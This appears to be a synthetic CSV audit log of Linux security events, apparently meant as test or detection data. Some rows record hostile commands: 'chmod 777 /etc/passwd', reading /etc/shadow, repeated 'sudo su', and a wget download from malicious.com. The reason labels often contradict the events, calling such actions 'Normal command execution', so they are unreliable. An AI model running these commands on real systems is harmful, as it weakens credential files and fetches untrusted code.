timestamp,user_id,event_type,resource,action,command,result,ip_address,session_id,reason
2025-05-03T16:51:17Z,U9923,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.85,56501,Normal command execution
2025-05-05T08:16:17Z,U4033,file_access,/etc/passwd,write,,success,10.0.0.199,92809,Normal command execution
2025-05-04T08:53:17Z,U1728,file_access,/etc/shadow,read,,success,10.0.0.142,12990,Routine system scan
2025-05-03T13:04:17Z,U1392,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.176,89122,Privileged command executed
2025-05-03T18:29:17Z,U1476,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.168,80010,Normal command execution
2025-05-06T07:12:17Z,U4672,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.217,19057,Access to sensitive file
2025-05-01T18:50:17Z,U3604,file_access,/etc/passwd,write,,success,10.0.0.132,49847,Administrative task
2025-05-02T07:30:17Z,U8972,exec,/bin/bash,run,sudo su,success,10.0.0.148,44175,Normal command execution
2025-04-30T20:45:17Z,U8274,file_access,/etc/passwd,write,,failure,10.0.0.219,58591,Segmentation fault
2025-05-05T03:02:17Z,U4973,file_access,/etc/shadow,write,,success,10.0.0.70,49733,Routine system scan
2025-05-01T00:13:17Z,U4394,file_access,/etc/passwd,write,,success,10.0.0.247,20294,Routine system scan
2025-05-04T19:26:17Z,U4819,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.140,68887,Administrative task
2025-05-06T07:41:17Z,U4633,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.175,98057,Normal command execution
2025-04-30T17:22:17Z,U5005,file_access,/etc/shadow,read,,failure,10.0.0.123,36770,Permission denied
2025-04-30T16:15:17Z,U3446,exec,/bin/sudo,run,sudo su,failure,10.0.0.109,53635,Permission denied
2025-05-06T00:56:17Z,U8971,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.14,77487,Access to sensitive file
2025-05-03T02:48:17Z,U2826,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.238,14104,Invalid argument
2025-05-01T19:09:17Z,U8462,exec,/usr/bin/top,run,chmod 777 /etc/passwd,failure,10.0.0.71,11160,Invalid argument
2025-05-03T19:18:17Z,U2923,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.111,60510,Access to sensitive file
2025-05-01T04:19:17Z,U8914,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.87,86849,Normal command execution
2025-05-06T21:23:17Z,U9140,file_access,/etc/shadow,read,,success,10.0.0.130,88248,Privileged command executed
2025-05-03T02:35:17Z,U4216,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.24,14096,Invalid argument
2025-05-04T06:34:17Z,U7457,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.3,65804,Segmentation fault
2025-05-01T10:36:17Z,U9502,file_access,/etc/shadow,read,,failure,10.0.0.183,22670,Permission denied
2025-05-03T22:57:17Z,U7859,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.121,39649,Routine system scan
2025-05-03T05:43:17Z,U1892,exec,/bin/bash,run,ls -al /etc,success,10.0.0.201,87747,Administrative task
2025-05-03T05:43:17Z,U6353,file_access,/etc/shadow,read,,success,10.0.0.84,72871,Routine system scan
2025-05-04T20:03:17Z,U1415,file_access,/etc/shadow,write,,failure,10.0.0.100,19910,Permission denied
2025-05-04T13:53:17Z,U9301,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.120,80817,Routine system scan
2025-05-03T05:26:17Z,U7925,exec,/bin/sudo,run,wget http://malicious.com/script.sh,success,10.0.0.198,21884,Normal command execution
2025-05-02T04:18:17Z,U6511,exec,/bin/bash,run,sudo su,success,10.0.0.246,50645,Access to sensitive file
2025-05-02T18:43:17Z,U7686,exec,/bin/sudo,run,sudo su,success,10.0.0.2,15573,Administrative task
2025-05-06T23:03:17Z,U8756,exec,/usr/bin/wget,run,wget http://malicious.com/script.sh,success,10.0.0.192,21166,Access to sensitive file
2025-05-03T18:17:17Z,U1473,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.205,44628,Normal command execution
2025-04-30T16:37:17Z,U2825,exec,/bin/bash,run,sudo su,success,10.0.0.188,89185,Privileged command executed
2025-05-05T05:41:17Z,U4937,exec,/usr/bin/wget,run,sudo su,success,10.0.0.231,76624,Access to sensitive file
2025-05-04T21:54:17Z,U9616,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.108,44495,Permission denied
